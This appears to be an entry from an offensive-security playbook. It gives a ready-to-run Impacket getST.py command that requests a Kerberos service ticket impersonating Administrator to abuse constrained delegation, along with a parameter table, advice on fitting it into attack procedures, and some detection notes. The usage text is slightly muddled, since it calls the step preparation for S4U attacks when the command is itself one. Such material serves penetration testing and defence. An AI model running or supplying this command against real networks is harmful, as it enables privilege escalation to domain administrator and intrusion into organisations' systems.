---
id: 535af642-7341-40ee-b599-d99fa47ef0b4
name: getst-service-ticket-request
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:07.695160+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - kerberos
  - impacket
validated: true
---

# getst-service-ticket-request

## Code

```python
getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
```

## Description

Python script invocation using Impacket to request a Kerberos service ticket with impersonation for constrained delegation exploitation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| SPN | Service Principal Name | HOST/SQL01.DOMAIN |
| CREDENTIALS | Domain/user:password | DOMAIN/user:pass |
| IMPERSONATE | User to impersonate | Administrator |
| DC_IP | Domain Controller IP | 10.10.10.10 |

## Usage

Execute on a Linux host with Impacket installed to obtain a TGS for pass-the-ticket. Integrate into procedures for initial ticket acquisition before S4U attacks.

## Detection

- Network traffic to DC on port 88 with unusual AS-REQ/TGS-REQ.
- Process monitoring for python/getST.py execution.
- Kerberos event logs showing impersonated requests.

## Related

- [[procedures/kerberos-constrained-delegation-exploitation]]
- [[tools/Impacket-GetST]]
